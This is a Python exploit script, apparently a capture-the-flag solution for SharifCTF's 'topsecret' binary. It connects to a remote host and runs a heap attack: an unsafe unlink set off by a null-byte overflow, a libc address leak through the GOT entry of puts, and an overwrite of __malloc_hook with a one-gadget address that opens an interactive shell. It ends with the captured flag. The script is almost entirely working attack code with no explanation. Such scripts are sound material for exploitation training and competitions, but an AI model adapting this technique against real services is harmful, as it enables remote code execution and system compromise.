from ntpwn import *

key = 'wjigaep;r[jg]ahrg[es9hrg'

s = remote('213.233.161.38',22107)
e = ELF('./topsecret')
l = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def init():
	s.sendlineafter('ey: ',key)

def create(idx,size,bors,content):
	s.sendlineafter('> ','1')
	s.sendlineafter(': ',idx)
	s.sendlineafter(': ',size)
	s.sendlineafter(': ',bors) # binary(0) / string(1)
	s.sendafter(': ',content)

def dele(idx):
	s.sendlineafter('> ','2')
	s.sendlineafter(': ',idx)

def edit(idx,bors,content):
	s.sendlineafter('> ','3')
	s.sendlineafter(': ',idx)
	s.sendlineafter(': ',bors) # binary(0) / string(1)
	s.sendafter(': ',content)

def printa(idx):
	s.sendlineafter('> ','5')
	s.sendlineafter(': ',idx)
	s.recvuntil('content: ')

bss = 0x6020b8

# Unsafe Unlink
init()
create('0',str(0x108),'0','A' * 0x108)
create('1',str(0x118),'0','A' * 0xf0 + p64(0) + p64(0x21) + p64(0) * 3)
create('2',str(0x8),'0','A'*8)

payload = p64(0) * 2 + p64(bss-0x18) + p64(bss-0x10)
payload = payload.ljust(0x100,'A')
payload += p64(0x100)

edit('0','1',payload)
dele('1')

# Leak
edit('0','0','A' * 24 + p64(bss) + p64(0) + p64(e.got['puts']))
printa('2')
libc = u64(s.recv(8)) - l.symbols['puts']
oneshot = libc + 0x4526a
log.info("LIBC BASE : " + hex(libc))

# Got Overwrite
edit('0','0',p64(bss) + p64(0) + p64(libc + l.symbols['__malloc_hook']))
edit('2','0',p64(oneshot))

s.sendlineafter('> ','1')
s.sendlineafter(': ','1')
s.sendlineafter(': ','1')

s.interactive()

# SharifCTF{R34V1L1NG_S3CR3T5_VI4_51NGL3_NULL_BY73}
